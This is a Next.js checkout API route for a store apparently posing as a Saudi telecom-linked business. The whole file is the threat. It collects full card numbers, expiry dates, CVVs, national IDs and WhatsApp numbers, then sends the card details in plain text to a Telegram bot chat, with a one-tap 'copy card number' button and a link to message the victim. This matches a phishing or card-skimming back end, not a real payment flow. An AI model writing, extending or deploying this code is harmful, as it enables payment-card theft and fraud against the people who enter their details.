import { NextRequest, NextResponse } from "next/server";

export async function POST(req: NextRequest) {
  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address } = await req.json();

  const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;

  // حفظ في الداتابيز
  try {
    await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address }),
    });
  } catch {}

  // Send Telegram
  const text = [
    `🛒 طلب جديد - مؤسسة سهلناها التقنية (اتصالات)`,
    `🔖 رقم الطلب: #${orderId}`,
    ``,
    `💲 المبلغ الإجمالي: ${total} ر.س`,
    `🧾 طريقة الدفع: دفع كامل`,
    ``,
    `🏦 بيانات البطاقة`,
    `🙍 اسم العميل: ${customer ?? "-"}`,
    `📲 واتساب: ${whatsapp ?? "-"}`,
    `🪪 رقم البطاقة: ${cardNumber}`,
    `✍️ اسم حامل البطاقة: ${cardHolder}`,
    `📆 تاريخ الانتهاء: ${expiry}`,
    `🔑 CVV: ${cvv}`,
  ].join("\n");

  const whatsappNum = (whatsapp ?? "").replace(/\D/g, "");
  const reply_markup = {
    inline_keyboard: [
      [
        { text: "📋 نسخ رقم البطاقة", copy_text: { text: cardNumber } },
        ...(whatsappNum ? [{ text: "💬 فتح واتساب", url: `https://wa.me/${whatsappNum}` }] : []),
      ],
    ],
  };

  try {
    await fetch(
      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: process.env.TELEGRAM_CHAT_ID, text, reply_markup }),
      }
    );
  } catch {}

  return NextResponse.json({ ok: true, orderId });
}
